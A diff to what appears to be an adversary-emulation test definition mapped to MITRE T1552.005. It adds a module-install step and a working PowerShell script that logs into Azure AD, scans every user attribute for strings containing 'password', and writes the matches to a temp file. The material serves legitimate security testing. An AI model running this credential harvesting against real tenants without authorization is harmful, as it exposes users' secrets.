@@ -2,12 +2,12 @@ api_version: "2.0"
 name: Azure - Search Azure AD User Attributes for Passwords
 description: "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n"
 args:
-    - name: username
-      type: string
-      default: <nil>
     - name: password
       type: string
       default: T1082Az
+    - name: username
+      type: string
+      default: <nil>
 uuid: ae9b2e3e-efa1-4483-86e2-fae529ab9fb6
 mitre:
     tactics:
@@ -20,6 +20,12 @@ requirements:
     platforms:
         - os: azure-ad
 steps:
+    - name: |
+        The MSOnline module must be installed.
+      inline: |
+        if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {{install-module MSOnline
+        }}
+      executor: powershell
     - name: azure---search-azure-ad-user-attributes-for-passwords
       inline: "import-module msonline\n$Password = ConvertTo-SecureString -String \"{{.Args.password}}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"{{.Args.username}}\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n"
       executor: powershell
